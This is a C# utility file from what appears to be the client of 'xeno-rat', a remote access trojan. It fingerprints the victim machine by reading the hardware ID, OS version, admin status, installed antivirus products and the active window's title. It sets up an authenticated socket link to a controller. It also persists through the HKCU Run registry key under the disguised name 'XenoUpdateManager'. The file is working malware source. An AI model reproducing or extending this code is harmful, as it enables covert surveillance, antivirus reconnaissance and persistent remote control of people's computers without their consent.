using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    public class Utils
    {
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsUserAnAdmin();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("user32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        public static string GetCaptionOfActiveWindow()
        {
            string strTitle = string.Empty;
            IntPtr handle = GetForegroundWindow();
            int intLength = GetWindowTextLength(handle) + 1;
            StringBuilder stringBuilder = new StringBuilder(intLength);
            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }
            try
            {
                uint pid;
                GetWindowThreadProcessId(handle, out pid);
                Process proc=Process.GetProcessById((int)pid);
                if (strTitle == "")
                {
                    strTitle = proc.ProcessName;
                }
                else 
                {
                    strTitle = proc.ProcessName + " - " + strTitle;
                }
                proc.Dispose();
            }
            catch 
            { 
                
            }
            return strTitle;
        }

        public static bool IsAdmin()
        {
            bool admin = false;
            try
            {
                admin = IsUserAnAdmin();
            }
            catch { }
            return admin;
        }
        public static string GetAntivirus()
        {
            List<string> antivirus = new List<string>();
            try
            {
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        string anti = Instance.GetPropertyValue("displayName").ToString();
                        if (!antivirus.Contains(anti)) 
                        {
                            antivirus.Add(anti);
                        }
                        Instance.Dispose();
                    }
                    if (antivirus.Count == 0) 
                    {
                        antivirus.Add("N/A");
                    }   
                }
                return string.Join(", ", antivirus);
            }
            catch
            {
                if (antivirus.Count == 0)
                {
                    antivirus.Add("N/A");
                }
                return string.Join(", ", antivirus);
            }
        }

        public static string GetWindowsVersion()
        {
            string r = "";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                ManagementObjectCollection information = searcher.Get();
                if (information != null)
                {
                    foreach (ManagementObject obj in information)
                    {
                        r = obj["Caption"].ToString() + " - " + obj["OSArchitecture"].ToString();
                    }
                    information.Dispose();
                }
            }
            return r;
        }
        public static string HWID()
        {
            try
            {
                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion,new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
            }
            catch
            {
                return "UNKNOWN";
            }
        }

        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 20).ToUpper();
        }
        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
        {
            Node conn;
            try
            {
                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                if (!(await conn.AuthenticateAsync(type, ID)))
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
            return conn;
        }
        public static bool AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
        {
            // Set the registry key path
            string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            try
            {
                // Open the Run key with RegistryView.Registry64 option
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                {
                    key.SetValue(name, "\"" + executablePath + "\"");
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
